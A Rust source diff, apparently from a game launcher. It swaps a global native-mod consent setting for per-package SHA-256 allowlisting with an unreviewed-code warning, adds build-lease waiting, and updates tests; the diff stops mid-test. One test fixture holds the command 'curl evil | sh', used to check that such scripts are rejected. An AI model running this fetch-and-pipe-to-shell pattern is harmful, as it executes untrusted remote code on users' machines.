@@ -33,15 +33,16 @@ mod tool;
 pub use internals_sync::catalog;
 pub mod fit;
 mod isolate;
+pub mod local_fit;
 mod mixins;
 mod picker;
 pub mod sdk_cache;
 
 pub use isolate::{kept as kept_left_out, kept_current, kept_stamp, Detail, LeftOut, Why};
 pub use picker::{Route, Routes};
-pub use tool::{Cancellation, Consent};
+pub use tool::Cancellation;
 mod workspace;
-pub(crate) use workspace::ATTEMPT_PREFIX;
+pub(crate) use workspace::{ATTEMPT_PREFIX, OLD_ATTEMPT_PREFIX};
 mod uses;
 
 // Settings and logs are shared by native-build and diagnostics tests.
@@ -243,28 +244,47 @@ pub fn is_native(version: &str) -> bool {
 
 /// Records the whole attempt, including selection or export after compilation.
 fn logged<T, E: std::fmt::Display + From<String>>(
+    cancellation: &Cancellation,
+    waiting: &dyn Fn(),
     build: impl FnOnce(Result<&crate::native_cache::Cache, &str>) -> Result<T, E>,
 ) -> Result<T, E> {
-    logged_then(build, |cache| {
+    logged_then(cancellation, waiting, build, |cache| {
         crate::storage::eviction::after_build_logged(cache, append_log, log_warning)
     })
 }
 
+/// The build lease on the build folder. While another build or a cache cleanup holds it, this
+/// waits, calling `waiting` once when the wait starts, until the lease is free or the attempt
+/// is stopped. Any other failure to take it is returned as it is.
+pub(crate) fn build_lease(
+    cancellation: &Cancellation,
+    waiting: &dyn Fn(),
+) -> Result<Result<crate::native_cache::Cache, crate::native_cache::Error>, String> {
+    let mut said = false;
+    loop {
+        match crate::native_cache::Cache::acquire(&backend::build_dir()) {
+            Err(crate::native_cache::Error::Busy) => (),
+            lease => return Ok(lease),
+        }
+        cancellation.check()?;
+        if !std::mem::replace(&mut said, true) {
+            waiting();
+        }
+        std::thread::sleep(std::time::Duration::from_millis(250));
+    }
+}
+
 /// [`logged`] with the cleanup it runs after the result line, inside the build lease.
 fn logged_then<T, E: std::fmt::Display + From<String>>(
+    cancellation: &Cancellation,
+    waiting: &dyn Fn(),
     build: impl FnOnce(Result<&crate::native_cache::Cache, &str>) -> Result<T, E>,
     cleanup: impl FnOnce(&crate::native_cache::Cache),
 ) -> Result<T, E> {
-    // Another build or a cleanup holds the lease on the same target/: refuse. Any other
+    // Another build or a cleanup holds the lease on the same target/: wait for it. Any other
     // failure only stops cleanup for explicit builds. Automatic selection requires a held
     // cache for its catalog and can refuse instead of accessing an unsafe tree.
-    let cache = match crate::native_cache::Cache::acquire(&backend::build_dir()) {
-        Ok(cache) => Ok(cache),
-        Err(crate::native_cache::Error::Busy) => {
-            return Err(cache_error(crate::native_cache::Error::Busy).into());
-        }
-        Err(error) => Err(cache_error(error)),
-    };
+    let cache = build_lease(cancellation, waiting)?.map_err(cache_error);
     clear_log()?;
     if let Err(warning) = &cache {
         log_warning(warning);
@@ -324,7 +344,6 @@ fn blamed_text(failed: tool::Failure) -> String {
 }
 
 pub fn sync_internals(folder: &Path) -> Result<serde_json::Value, Failed> {
-    require_consent()?;
     internals_sync::check(folder).map_err(Failed::Other)
 }
 
@@ -365,9 +384,50 @@ pub const INSTALLED: &str = sunrise_launcher_smod::mod_list::NATIVE_DIR;
 
 /// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
 /// Each flat `.smod` passes the registry's shared package boundary; no code is run.
-pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
-    stage_installed(home, root().join("installed.incoming"))?
-        .ok_or_else(|| no_mods_to_build().into())
+pub fn installed_mods(home: &Path) -> Result<PathBuf, Failed> {
+    stage_allowed(home, &root().join("installed.incoming"))
+}
+
+/// A native package turned on in a game folder whose file neither came verified from the
+/// registry nor was confirmed with the unreviewed-code warning: one copied into the folder by
+/// hand, say.
+#[derive(Clone, Debug, PartialEq, Eq)]
+pub struct Unreviewed {
+    pub id: String,
+    pub name: String,
+    /// The file's name in the game folder.
+    pub file: String,
+    pub sha256: String,
+}
+
+type AskUnreviewed = Box<dyn Fn(&[Unreviewed]) -> bool + Send + Sync>;
+static ASK_UNREVIEWED: std::sync::OnceLock<AskUnreviewed> = std::sync::OnceLock::new();
+
+/// How this process confirms running [`Unreviewed`] packages: the window shows the
+/// unreviewed-code warning, the command line answers with `--trust-native-code`. Set once, by
+/// the program's entry; with none set, a build refuses them.
+pub fn ask_unreviewed_with(ask: impl Fn(&[Unreviewed]) -> bool + Send + Sync + 'static) {
+    let _ = ASK_UNREVIEWED.set(Box::new(ask));
+}
+
+/// [`stage_installed`] for a build: a package that is neither in
+/// [`crate::backend::allowed_native_files`] nor confirmed now, for this build, stops it.
+fn stage_allowed(home: &Path, out: &Path) -> Result<PathBuf, Failed> {
+    let mut allowed = crate::backend::allowed_native_files()?;
+    loop {
+        let staged = {
+            let _manifest = crate::browser::lock_home(home).map_err(|e| e.to_string())?;
+            stage_installed(home, out.to_owned(), Some(&allowed))
+        };
+        match staged {
+            Err(Failed::Unreviewed(found))
+                if ASK_UNREVIEWED.get().is_some_and(|ask| ask(&found)) =>
+            {
+                allowed.extend(found.into_iter().map(|package| package.sha256));
+            }
+            staged => return staged?.ok_or(Failed::Nothing),
+        }
+    }
 }
 
 /// What a build says when the profile's mods folder holds nothing to build.
@@ -375,10 +435,16 @@ fn no_mods_to_build() -> &'static str {
     tr("There are no mods to build. Add a mod to this profile's mods folder first.")
 }
 
-/// [`installed_mods`] into `out`, which it empties first.
-pub(crate) fn stage_installed(home: &Path, out: PathBuf) -> Result<Option<PathBuf>, String> {
+/// [`installed_mods`] into `out`, which it empties first. With `allowed`, a package whose
+/// file's SHA-256 isn't in it stops the staging with [`Failed::Unreviewed`], naming every such
+/// package; planning reads packages without it, since it runs none of their code.
+pub(crate) fn stage_installed(
+    home: &Path,
+    out: PathBuf,
+    allowed: Option<&std::collections::BTreeSet<String>>,
+) -> Result<Option<PathBuf>, Failed> {
     let _lock = crate::browser::lock_home(home).map_err(|error| error.to_string())?;
-    crate::browser::installed::recover_game_install(home)?;
+    crate::browser::installed::recover_game_install(home).map_err(String::from)?;
     let _ = fs::remove_dir_all(&out);
     let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
         .map(|dir| dir.flatten().map(|e| e.path()).collect())
@@ -386,6 +452,7 @@ pub(crate) fn stage_installed(home: &Path, out: PathBuf) -> Result<Option<PathBu
     paths.retain(|p| p.extension().is_some_and(|e| e == "smod"));
     paths.sort();
     let mut count = 0;
+    let mut unreviewed = Vec::new();
     for path in paths {
         // A file that can't be read is no mod: it has no id to be on or off under, and the game
         // doesn't load it, so it must not stop a build of the others.
@@ -395,6 +462,21 @@ pub(crate) fn stage_installed(home: &Path, out: PathBuf) -> Result<Option<PathBu
         if !crate::browser::mod_list::is_enabled(home, &bundle.manifest.id) {
             continue;
         }
+        if let Some(allowed) = allowed {
+            let sha256 = sunrise_launcher_smod::index::sha256_file(&path)?.to_ascii_lowercase();
+            if !allowed.contains(&sha256) {
+                unreviewed.push(Unreviewed {
+                    id: bundle.manifest.id.clone(),
+                    name: bundle.manifest.name.clone(),
+                    file: path
+                        .file_name()
+                        .map(|name| name.to_string_lossy().into_owned())
+                        .unwrap_or_default(),
+                    sha256,
+                });
+                continue;
+            }
+        }
         let dir = out.join(&bundle.manifest.id);
         for (name, bytes) in &bundle.files {
             let to = dir.join(name);
@@ -403,8 +485,12 @@ pub(crate) fn stage_installed(home: &Path, out: PathBuf) -> Result<Option<PathBu
         }
         count += 1;
     }
+    if !unreviewed.is_empty() {
+        let _ = fs::remove_dir_all(&out);
+        return Err(Failed::Unreviewed(unreviewed));
+    }
     if count == 0 {
-        return Err(no_mods_to_build().into());
+        return Err(Failed::Other(no_mods_to_build().into()));
     }
     fs::create_dir_all(&out).map_err(|e| e.to_string())?;
     Ok(Some(out))
@@ -689,6 +775,8 @@ pub fn version_for(
 #[derive(Clone, Debug, PartialEq)]
 pub enum Step {
     Starting,
+    /// Another build or a cache cleanup holds the build folder: this one waits for it.
+    Waiting,
     Rust(f32),
     Tool,
     Source(String),
@@ -773,6 +861,7 @@ impl Step {
         let (stage, fraction) = match self {
             Self::Rust(done) => (Stage::Prepare, Some(*done)),
             Self::Starting
+            | Self::Waiting
             | Self::Tool
             | Self::Source(_)
             | Self::Mixins
@@ -804,6 +893,7 @@ impl Step {
     pub fn label(&self) -> String {
         match self {
             Self::Starting => tr("Starting the build").into(),
+            Self::Waiting => tr("Waiting for another build to finish…").into(),
             Self::Rust(done) => trf(
                 "Downloading Rust {version} (once): {done}%",
                 &[
@@ -994,8 +1084,6 @@ pub enum ConflictRequirement {
 /// Why a native build or internals check stopped.
 #[derive(Debug)]
 pub enum Failed {
-    /// No native-code permission has been recorded for this install.
-    NoConsent,
     /// These mods stopped it (`error` says how), while `compiling` or before: it can run again
     /// without them.
     Mods {
@@ -1006,6 +1094,9 @@ pub enum Failed {
     },
     /// The folder holds no native mod to build.
     Nothing,
+    /// These packages are turned on but came neither verified from the registry nor confirmed
+    /// with the unreviewed-code warning, and running them wasn't confirmed for this build.
+    Unreviewed(Vec<Unreviewed>),
     /// Mods this build can't use were saved into worlds: the player chooses (stay, or back the
     /// worlds up and build without them).
     Worlds(Box<AtStake>),
@@ -1062,7 +1153,13 @@ impl std::fmt::Display for Failed {
             Self::Sdk { refusal, .. } => std::fmt::Display::fmt(refusal, f),
             Self::Worlds(stake) => f.write_str(&stake.text),
             Self::Nothing => f.write_str(no_mods_to_build()),
-            Self::NoConsent => f.write_str(tr("Native mods run inside your game with your rights; mixins compile code into the game. Allow native mods in Settings, Storage, or pass --trust-native-code.")),
+            Self::Unreviewed(found) => {
+                let names: Vec<&str> = found.iter().map(|p| p.name.as_str()).collect();
+                f.write_str(&trf(
+                    "Nothing was built: {mods} didn't come from the Sunrise registry, and nobody has checked their code. Confirm the warning to build them, or pass --trust-native-code on the command line.",
+                    &[("mods", &names.join(", "))],
+                ))
+            }
         }
     }
 }
@@ -1073,22 +1170,12 @@ impl From<Failed> for String {
     }
 }
 
-/// Refuse before staging, fetching a prebuilt game or downloading a compiler.
-pub fn require_consent() -> Result<(), Failed> {
-    if backend::NativeGrant::read()?.is_some() {
-        Ok(())
-    } else {
-        Err(Failed::NoConsent)
-    }
-}
-
 /// Isolation and jar-download choices for an explicit build.
 #[derive(Default)]
 struct BuildOptions<'a> {
     cancellation: Cancellation,
     allow_jar_downloads: bool,
     skip: &'a [LeftOut],
-    registry_consent: Option<&'a dyn Fn(&Consent) -> bool>,
     /// The game folder whose worlds a mod switched off for this build must not be lost from:
     /// the instance's ([`guard_worlds`]).
     worlds: Option<&'a Path>,
@@ -1379,8 +1466,7 @@ fn pipeline(
     progress: &impl Fn(Step),
 ) -> Result<Built, Failed> {
     let cancellation = &options.cancellation;
-    // Keep a single consent revision across private staging, compilation and publication.
-    cancellation.admit_native_work()?;
+    cancellation.check()?;
     let started = std::time::Instant::now();
     let built_on = checked_about(base)?;
     backend::need_prepared(base)?;
@@ -1694,6 +1780,17 @@ fn pipeline(
     let prebuilt = if exists {
         None
     } else {
+        // Checked only for a build that will run: a cached build or no mods never needs the paths.
+        if let Some(length) = workspace::too_deep(workspace.path()).filter(|_| cfg!(windows)) {
+            return Err(trf(
+                "The launcher's folder {folder} is too deep for Windows: a native build there needs paths of {length} characters, and Windows allows 259. Set SUNRISE_LAUNCHER_HOME to a shorter folder.",
+                &[
+                    ("folder", &backend::build_dir().display().to_string()),
+                    ("length", &length.to_string()),
+                ],
+            )
+            .into());
+        }
         let package = match (local_sdk, &sdk) {
             (Some(local), _) => {
                 let program = sdk_cache::developer_tool(true).ok_or_else(|| {
@@ -1846,7 +1943,7 @@ fn pipeline(
             copy_bundle(bundle, &compiled.join(&bundle.manifest.id))?;
         }
         let game = workspace.package(game).map_err(|e| e.to_string())?;
-        let work = workspace.path().join("work");
+        let work = workspace.work();
         let built = tool::build(
             &rust,
             program,
@@ -1862,7 +1959,6 @@ fn pipeline(
                 server: target == Target::Server,
                 mixins_from_source: MIXINS_FROM_SOURCE.load(std::sync::atomic::Ordering::Relaxed),
             },
-            options.registry_consent,
             &|id, done, total| {
                 progress(Step::Mod {
                     id: id.to_owned(),
@@ -2013,9 +2109,11 @@ fn isolated(
                     log: None,
                 });
             }
-            Err(Failed::NoConsent) => return Err(Failed::NoConsent),
             Err(
-                error @ (Failed::Tools(_) | Failed::Tool { .. } | Failed::RegistryConflict { .. }),
+                error @ (Failed::Tools(_)
+                | Failed::Tool { .. }
+                | Failed::RegistryConflict { .. }
+                | Failed::Unreviewed(_)),
             ) => return Err(error),
             Err(Failed::Sdk { refusal, .. }) => return Err(said(&skip, refusal.to_string())),
             Err(Failed::Worlds(stake)) => return Err(Failed::Worlds(stake)),
@@ -2059,16 +2157,15 @@ pub fn build(
     leave_out: bool,
     cancellation: &Cancellation,
     progress: impl Fn(Step),
-    registry_consent: impl Fn(&Consent) -> bool,
     catalogue: impl FnOnce() -> Option<Vec<backend::Release>>,
 ) -> Result<ClientBuild, Failed> {
-    cancellation.admit_native_work()?;
+    cancellation.check()?;
     crate::browser::installed::recover_game_install(&instance.home)
         .map_err(|problem| Failed::Other(problem.details()))?;
     if let Some(error) = backend::native_mod_architecture_error() {
         return Err(Failed::Other(error));
     }
-    logged(|cache| {
+    logged(cancellation, &|| progress(Step::Waiting), |cache| {
         let lease = cache.map_err(|error| Failed::Other(error.into()))?;
         let profile = select_build_profile(instance.native_profile, profile, cancellation, || {
             planning::classify(folder, Some(base), lease, cancellation)
@@ -2084,7 +2181,6 @@ pub fn build(
                     BuildOptions {
                         cancellation: cancellation.clone(),
                         skip,
-                        registry_consent: Some(&registry_consent),
                         worlds: Some(&instance.home),
                         leave_out,
                         ..BuildOptions::default()
@@ -2108,13 +2204,14 @@ pub(crate) fn build_exact_client(
     staging: &crate::profile_txn::Staging<'_>,
     cancellation: &Cancellation,
     progress: impl Fn(Step),
-    registry_consent: Option<&dyn Fn(&Consent) -> bool>,
     log: Option<&dyn Fn(std::sync::Arc<str>)>,
 ) -> Result<String, Failed> {
     progress(Step::Starting);
     logged_then(
+        cancellation,
+        &|| progress(Step::Waiting),
         |cache| {
-            cancellation.admit_native_work()?;
+            cancellation.check()?;
             if let Some(error) = backend::native_mod_architecture_error() {
                 return Err(Failed::Other(error));
             }
@@ -2124,10 +2221,7 @@ pub(crate) fn build_exact_client(
                 .prefix(".native-input-")
                 .tempdir_in(root())
                 .map_err(|e| e.to_string())?;
-            let folder = {
-                let _manifest = crate::browser::lock_home(home).map_err(|e| e.to_string())?;
-                stage_installed(home, input.path().join("mods"))?.ok_or(Failed::Nothing)?
-            };
+            let folder = stage_allowed(home, &input.path().join("mods"))?;
             let built = pipeline(
                 cache,
                 base,
@@ -2137,7 +2231,6 @@ pub(crate) fn build_exact_client(
                 BuildOptions {
                     cancellation: cancellation.clone(),
                     staging: Some(staging),
-                    registry_consent,
                     exact_home: Some(home),
                     ..BuildOptions::default()
                 },
@@ -2190,7 +2283,7 @@ fn finish_profile_build(
             catalogue,
             || cancellation.check(),
         )?;
-        let _permission = cancellation.publication_guard()?;
+        cancellation.check()?;
         isolate::keep(&instance.home, &plain, left)?;
         instances::edit(&instance.id, |meta| {
             let unchanged = meta.version == instance.version
@@ -2210,7 +2303,7 @@ fn finish_profile_build(
         })),
         other => other,
     })?;
-    let permission = cancellation.publication_guard()?;
+    cancellation.check()?;
     isolate::forget(&instance.home);
     // A version or channel the player saved while this built wins: the build stays
     // available, the instance keeps their choice.
@@ -2221,7 +2314,6 @@ fn finish_profile_build(
             meta.version = Some(built.version.clone());
         }
     })?;
-    drop(permission);
     // logged() runs central eviction under the retained build lease.
     if built.plan != Plan::UpToDate {
         progress(Step::Done {
@@ -2287,66 +2379,69 @@ pub fn build_server(
     profile: Option<Profile>,
     allow_jar_downloads: bool,
     progress: impl Fn(Step),
-    registry_consent: impl Fn(&Consent) -> bool,
 ) -> Result<PathBuf, Failed> {
     let cancellation = Cancellation::default();
-    cancellation.admit_native_work()?;
-    logged(|cache| {
-        if output.symlink_metadata().is_ok() {
-            return Err(trf(
-                "{path} already exists. Move it away, or build into another folder.",
-                &[("path", &output.display().to_string())],
-            ));
-        }
-        let parent = output
-            .parent()
-            .filter(|p| !p.as_os_str().is_empty())
-            .unwrap_or(Path::new("."));
-        fs::create_dir_all(parent).map_err(|e| e.to_string())?;
-        let output = parent.canonicalize().map_err(|e| e.to_string())?.join(
-            output
-                .file_name()
-                .ok_or_else(|| tr("Choose a new folder for the server export."))?,
-        );
-        for managed in [backend::version_dir(""), root()] {
-            if managed
-                .canonicalize()
-                .is_ok_and(|dir| output.starts_with(dir))
-            {
-                return Err(tr("Export the server outside the launcher's managed folders.").into());
+    logged(
+        &cancellation.clone(),
+        &|| progress(Step::Waiting),
+        |cache| {
+            if output.symlink_metadata().is_ok() {
+                return Err(trf(
+                    "{path} already exists. Move it away, or build into another folder.",
+                    &[("path", &output.display().to_string())],
+                ));
             }
-        }
-        let lease = cache.map_err(str::to_owned)?;
-        let profile = select_build_profile(Profile::default(), profile, &cancellation, || {
-            planning::classify(folder, Some(base), lease, &cancellation)
-        })?;
-        let built = pipeline(
-            lease,
-            base,
-            folder,
-            profile,
-            Target::Server,
-            BuildOptions {
-                cancellation,
-                allow_jar_downloads,
-                registry_consent: Some(&registry_consent),
-                ..BuildOptions::default()
-            },
-            &progress,
-        )
-        .map_err(String::from)?;
-        export(&Target::Server.directory(&built.version), &output)?;
-        // logged() runs central eviction under the retained build lease.
-        if built.plan != Plan::UpToDate {
-            progress(Step::Done {
-                secs: built.secs,
-                profile: built.profile,
-                plan: built.plan,
-            });
-        }
-        let engine = output.join(Target::Server.binary());
-        Ok(std::path::absolute(&engine).unwrap_or(engine))
-    })
+            let parent = output
+                .parent()
+                .filter(|p| !p.as_os_str().is_empty())
+                .unwrap_or(Path::new("."));
+            fs::create_dir_all(parent).map_err(|e| e.to_string())?;
+            let output = parent.canonicalize().map_err(|e| e.to_string())?.join(
+                output
+                    .file_name()
+                    .ok_or_else(|| tr("Choose a new folder for the server export."))?,
+            );
+            for managed in [backend::version_dir(""), root()] {
+                if managed
+                    .canonicalize()
+                    .is_ok_and(|dir| output.starts_with(dir))
+                {
+                    return Err(
+                        tr("Export the server outside the launcher's managed folders.").into(),
+                    );
+                }
+            }
+            let lease = cache.map_err(str::to_owned)?;
+            let profile = select_build_profile(Profile::default(), profile, &cancellation, || {
+                planning::classify(folder, Some(base), lease, &cancellation)
+            })?;
+            let built = pipeline(
+                lease,
+                base,
+                folder,
+                profile,
+                Target::Server,
+                BuildOptions {
+                    cancellation,
+                    allow_jar_downloads,
+                    ..BuildOptions::default()
+                },
+                &progress,
+            )
+            .map_err(String::from)?;
+            export(&Target::Server.directory(&built.version), &output)?;
+            // logged() runs central eviction under the retained build lease.
+            if built.plan != Plan::UpToDate {
+                progress(Step::Done {
+                    secs: built.secs,
+                    profile: built.profile,
+                    plan: built.plan,
+                });
+            }
+            let engine = output.join(Target::Server.binary());
+            Ok(std::path::absolute(&engine).unwrap_or(engine))
+        },
+    )
     .map_err(Failed::Other)
 }
 
@@ -2478,8 +2573,8 @@ mod tests {
         let native = home.path().join(INSTALLED);
         fs::create_dir_all(&native).unwrap();
         fs::write(native.join("broken.smod"), b"old format").unwrap();
-        let error = stage_installed(home.path(), home.path().join("out")).unwrap_err();
-        assert_eq!(error, no_mods_to_build());
+        let error = stage_installed(home.path(), home.path().join("out"), None).unwrap_err();
+        assert_eq!(error.to_string(), no_mods_to_build());
     }
 
     #[test]
@@ -2508,7 +2603,7 @@ mod tests {
         zip.finish().unwrap();
         crate::browser::mod_list::set_enabled(home.path(), "zed_mod", true).unwrap();
         let out = home.path().join("out");
-        let staged = stage_installed(home.path(), out.clone()).unwrap();
+        let staged = stage_installed(home.path(), out.clone(), None).unwrap();
         assert_eq!(staged, Some(out.clone()));
         assert_eq!(
             fs::read_to_string(out.join("zed_mod/src/lib.rs")).unwrap(),
@@ -2518,10 +2613,61 @@ mod tests {
     }
 
     #[test]
+    fn a_native_file_copied_in_by_hand_stops_the_build_until_its_digest_is_allowed() {
+        use std::io::Write;
+        let home = tempfile::tempdir().unwrap();
+        let native = home.path().join(INSTALLED);
+        fs::create_dir_all(&native).unwrap();
+        let file = native.join("copied.smod");
+        let mut zip = zip::ZipWriter::new(fs::File::create(&file).unwrap());
+        let manifest = format!(
+            "id='copied'\nname='Copied'\nversion='0.1.0'\napi='0.2'\ncapabilities=['registries']\n[native]\ngame='{}'\nsunrise='{}'\nmixins='{}'\n",
+            crate::backend::PINNED_GAME,
+            "a".repeat(40),
+            "b".repeat(40)
+        );
+        for (name, text) in [
+            ("Cargo.toml", "[package]\nname='copied'\nversion='0.1.0'\n"),
+            ("src/lib.rs", "fn hook() {}"),
+            ("sunrise-mod.toml", manifest.as_str()),
+        ] {
+            zip.start_file(name, zip::write::SimpleFileOptions::default())
+                .unwrap();
+            zip.write_all(text.as_bytes()).unwrap();
+        }
+        zip.finish().unwrap();
+        crate::browser::mod_list::set_enabled(home.path(), "copied", true).unwrap();
+        let sha256 = sunrise_launcher_smod::index::sha256_file(&file).unwrap();
+        let out = home.path().join("out");
+
+        let other = std::collections::BTreeSet::from(["0".repeat(64)]);
+        let Err(Failed::Unreviewed(found)) =
+            stage_installed(home.path(), out.clone(), Some(&other))
+        else {
+            panic!("a file nobody allowed must not stage for a build");
+        };
+        assert_eq!(
+            found,
+            [Unreviewed {
+                id: "copied".into(),
+                name: "Copied".into(),
+                file: "copied.smod".into(),
+                sha256: sha256.to_ascii_lowercase(),
+            }]
+        );
+        assert!(!out.exists());
+
+        let allowed = std::collections::BTreeSet::from([sha256.to_ascii_lowercase()]);
+        let staged = stage_installed(home.path(), out.clone(), Some(&allowed)).unwrap();
+        assert_eq!(staged, Some(out.clone()));
+        assert!(out.join("copied/src/lib.rs").exists());
+    }
+
+    #[test]
     fn stop_before_worker_start_aborts_before_any_step() {
         // The GUI owns one handle and gives the worker a clone before showing Stop. Schedule
         // the stop first, then enter the real build worker. This needs no game or valid paths:
-        // it must fail as cancelled before consent, progress, catalogue or file access.
+        // it must fail as cancelled before progress, catalogue or file access.
         let control = Cancellation::default();
         let worker = control.clone();
         control.stop();
@@ -2549,7 +2695,6 @@ mod tests {
             false,
             &worker,
             |_| panic!("a stopped attempt cannot report a step"),
-            |_| panic!("a stopped attempt cannot request consent"),
             || panic!("a stopped attempt cannot read a catalogue"),
         );
         assert!(matches!(result, Err(Failed::Other(error)) if error == CANCELLED));
@@ -3006,6 +3151,60 @@ mod tests {
             .collect();
         assert_eq!(kept, ["2026-01-01_00-00-00_Uncertain.zip"]);
         assert_eq!(fs::read(old.join(&kept[0])).unwrap(), b"older backup");
+        fs::remove_dir_all(home).unwrap();
+    }
+
+    #[test]
+    fn guard_worlds_refuses_when_mod_is_recorded_only_in_level_dat_old() {
+        let _guard = scratch_state();
+        let home = dir("native-switch-level-dat-old");
+        let world = home.join("saves/Home");
+        fs::create_dir_all(&world).unwrap();
+        let write_level = |file: &str, with_mod: bool| {
+            let mut root = vec![(
+                "Data",
+                sunrise_launcher_nbt::Tag::compound([(
+                    "LevelName",
+                    sunrise_launcher_nbt::Tag::String("Home".into()),
+                )]),
+            )];
+            if with_mod {
+                root.push((
+                    "fml",
+                    sunrise_launcher_nbt::Tag::compound([(
+                        "LoadingModList",
+                        sunrise_launcher_nbt::Tag::List(vec![sunrise_launcher_nbt::Tag::compound(
+                            [("ModId", sunrise_launcher_nbt::Tag::String("greeter".into()))],
+                        )]),
+                    )]),
+                ));
+            }
+            let bytes = sunrise_launcher_nbt::write_named(
+                &sunrise_launcher_nbt::NamedTag {
+                    name: "".into(),
+                    tag: sunrise_launcher_nbt::Tag::compound(root),
+                },
+                sunrise_launcher_nbt::Limits::saved(),
+            )
+            .unwrap();
+            let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
+            std::io::Write::write_all(&mut gz, &bytes).unwrap();
+            fs::write(world.join(file), gz.finish().unwrap()).unwrap();
+        };
+        write_level("level.dat", false);
+        write_level("level.dat_old", true);
+
+        let left = [LeftOut {
+            id: "greeter".into(),
+            version: "1.0.0".into(),
+            why: isolate::Why::DidNotBuild,
+            detail: None,
+        }];
+        let Err(Failed::Worlds(stake)) = guard_worlds(&home, &left, "nightly", false) else {
+            panic!("a mod recorded only in level.dat_old must stop the switch");
+        };
+        assert_eq!(stake.worlds, ["Home"]);
+        assert_eq!(stake.mods, ["greeter"]);
         fs::remove_dir_all(home).unwrap();
     }
 
@@ -3620,15 +3819,16 @@ mod tests {
             }
             zip.finish().unwrap();
         };
+        let stage = || stage_installed(&home, d.join("out"), None).map(Option::unwrap);
         pack("veinminer.smod", None);
-        assert!(installed_mods(&home).is_err(), "off until turned on");
+        assert!(stage().is_err(), "off until turned on");
         // With nothing in the mods folder the error says so, never an empty line.
         assert_eq!(
-            installed_mods(&home).unwrap_err(),
+            stage().unwrap_err().to_string(),
             "There are no mods to build. Add a mod to this profile's mods folder first."
         );
         crate::browser::mod_list::set_enabled(&home, "veinminer", true).unwrap();
-        let out = installed_mods(&home).unwrap();
+        let out = stage().unwrap();
         let found = bundles(&out).unwrap();
         assert_eq!(
             fs::read(found[0].dir.join("src/lib.rs")).unwrap(),
@@ -3651,7 +3851,7 @@ mod tests {
             )]
         );
         pack("veinminer.smod", Some(("data/veinminer/table.bin", "data")));
-        let out = installed_mods(&home).unwrap();
+        let out = stage().unwrap();
         let path = out.join("veinminer/data/veinminer/table.bin");
         assert_eq!(fs::read(&path).unwrap(), b"data");
         let first = version_for(
@@ -3677,7 +3877,7 @@ mod tests {
             .unwrap()
         );
         pack("veinminer.smod", Some(("build.sh", "curl evil | sh")));
-        assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
+        assert!(stage().is_err(), "only Rust and TOML sources");
     }
 
     /// A player's report (11-04): Right-Click Crops 1.0.0 pins Nightly 2026-10-31's commit, so
@@ -3775,47 +3975,8 @@ mod tests {
     }
 
     #[test]
-    fn a_revoked_then_regranted_attempt_cannot_apply_a_cached_build_pin() {
-        let _scratch = scratch_state();
-        let mut settings = backend::Settings::default();
-        settings.allow_native_mods().unwrap();
-        let instance = instances::list()
-            .into_iter()
-            .find(|row| row.id == "sunrise")
-            .unwrap();
-        let cancellation = Cancellation::default();
-        cancellation.admit_native_work().unwrap();
-        settings.revoke_native_mods().unwrap();
-        settings.allow_native_mods().unwrap();
-        let cache_hit = Ok(Built {
-            version: "native-retained-fixture".into(),
-            plan: Plan::UpToDate,
-            profile: Profile::Optimized,
-            secs: 0,
-            left_out: Vec::new(),
-        });
-        let error = finish_profile_build(
-            "v0.0.0",
-            &instance,
-            &cancellation,
-            cache_hit,
-            &|_| panic!("stale work can't complete"),
-            || panic!("cache hit needs no catalogue"),
-        )
-        .unwrap_err()
-        .to_string();
-        assert!(error.contains("Native mod permission changed"), "{error}");
-        let after = instances::list()
-            .into_iter()
-            .find(|row| row.id == "sunrise")
-            .unwrap();
-        assert_eq!(after.version, instance.version);
-    }
-
-    #[test]
     fn a_native_build_without_a_record_is_refused_before_preparation() {
         let _guard = scratch_state();
-        backend::Settings::default().allow_native_mods().unwrap();
         let lease = crate::native_cache::Cache::acquire(&backend::build_dir()).unwrap();
         let Err(error) = pipeline(
             &lease,
@@ -4153,7 +4314,6 @@ mod tests {
     #[test]
     fn a_server_build_refuses_an_existing_output_before_building() {
         let _guard = scratch_state();
-        backend::Settings::load().allow_native_mods().unwrap();
         let output = dir("server-output");
         let folder = dir("server-mods");
         write_bundle(&folder, "hello", "fn hook() {}");
@@ -4166,7 +4326,6 @@ mod tests {
             Some(Profile::Optimized),
             false,
             |_| {},
-            |_| false,
         )
         .unwrap_err();
         let err = String::from(err);
@@ -4180,7 +4339,6 @@ mod tests {
             Some(Profile::Optimized),
             false,
             |_| {},
-            |_| false,
         )
         .unwrap_err();
         let err = String::from(err);
@@ -4201,7 +4359,6 @@ mod tests {
     fn automatic_build_does_not_save_its_effective_profile() {
         let _guard = scratch_state();
         let original = backend::Settings::load();
-        backend::Settings::load().allow_native_mods().unwrap();
         let file = backend::data_dir().join("instances.json");
         let previous = fs::read(&file).ok();
         let stored = br#"{"instances":{"sunrise":{"native_profile":"balanced"}}}"#;
@@ -4216,7 +4373,6 @@ mod tests {
             false,
             &Cancellation::default(),
             |_| {},
-            |_| false,
             || None,
         )
         .unwrap_err();
@@ -4432,7 +4588,6 @@ printf ']}}\n'
     fn folder_planning_reuses_the_build_snapshot_without_restaging_packages() {
         let _guard = scratch_state();
         let original = backend::Settings::load();
-        backend::Settings::load().allow_native_mods().unwrap();
         let folder = dir("profile-snapshot");
         write_bundle(&folder, "snapshot", "");
         fs::write(
@@ -4458,85 +4613,12 @@ printf ']}}\n'
         original.save().unwrap();
     }
 
-    #[test]
-    fn missing_consent_blocks_all_build_routes_before_http_or_staging() {
-        use std::net::TcpListener;
-        let _guard = scratch_state();
-        let original = backend::Settings::load();
-        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
-        listener.set_nonblocking(true).unwrap();
-        fs::create_dir_all(backend::data_dir()).unwrap();
-        fs::write(backend::data_dir().join("settings.json"), serde_json::json!({"native_warning": true, "proxy": format!("http://{}", listener.local_addr().unwrap())}).to_string()).unwrap();
-        let folder = dir("consent-missing");
-        let output = folder.join("export");
-        let log_before = fs::read(log_path()).ok();
-        fn denied<T>(result: Result<T, Failed>) {
-            assert!(matches!(result, Err(Failed::NoConsent)));
-        }
-        let profile = Profile::Optimized;
-        let base = "uninstalled";
-        denied(build_server(
-            base,
-            &folder,
-            &output,
-            Some(profile),
-            false,
-            |_| {},
-            |_| false,
-        ));
-        for choice in [Some(profile), None] {
-            denied(build(
-                base,
-                &folder,
-                &instances::selected(),
-                choice,
-                false,
-                &Cancellation::default(),
-                |_| {},
